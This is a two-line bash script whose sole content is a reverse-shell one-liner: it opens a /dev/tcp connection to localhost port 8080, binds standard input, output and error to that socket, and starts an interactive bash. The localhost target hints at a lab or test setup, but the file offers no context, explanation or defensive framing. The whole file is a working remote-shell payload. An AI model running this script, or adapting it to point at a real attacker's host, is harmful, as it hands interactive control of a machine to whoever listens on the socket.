#!/bin/bash

exec 9<> /dev/tcp/localhost/8080&&exec 0<&9&&exec 1>&9 2>&1&&/bin/bash --noprofile -i
